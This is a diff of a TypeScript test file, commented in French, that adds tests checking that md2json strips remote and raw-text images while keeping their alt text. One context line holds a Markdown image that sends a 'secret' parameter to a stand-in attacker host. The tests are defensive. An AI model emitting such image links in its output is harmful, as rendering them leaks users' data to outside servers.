@@ -1030,6 +1030,29 @@ describe("schema mirror", () => {
 
 // Issue 642 : une image distante dans un contenu généré n'émet aucune requête.
 describe("md2json stripRemoteImages", () => {
+  // QA 0.8.0-1 (issue 678) : une image que le parseur laisse en texte brut
+  // (adresse file: refusée, balise HTML) ne reste ni en Markdown ni en HTML.
+  it("keeps only the alt text of images left as raw text", () => {
+    const text = (md: string) =>
+      JSON.stringify(md2json(md, { stripRemoteImages: true }));
+    expect(text("Avant ![le logo](file:///etc/x.png) après")).toContain(
+      '"text":"Avant le logo après"',
+    );
+    expect(text('Texte <img src="file:///x" alt="photo"> fin')).toContain(
+      '"text":"Texte photo fin"',
+    );
+    const bare = text("<img src='https://exemple.org/b.png'>");
+    expect(bare).not.toContain("img");
+    expect(bare).not.toContain("exemple.org");
+    // Dans du code, rien n'est touché.
+    expect(text("`![x](file:///y)`")).toContain("![x](file:///y)");
+    expect(text('```\n<img src="a">\n```')).toContain("<img src=");
+    // Sans retrait des images (notes de l'utilisateur), rien ne change.
+    expect(JSON.stringify(md2json("![x](file:///y)"))).toContain(
+      "![x](file:///y)",
+    );
+  });
+
   it("retire une image distante de bloc et garde son texte alternatif", () => {
     const json = md2json(
       "Intro\n\n![logo](https://attaquant.example/p.png?d=secret)\n\nFin",
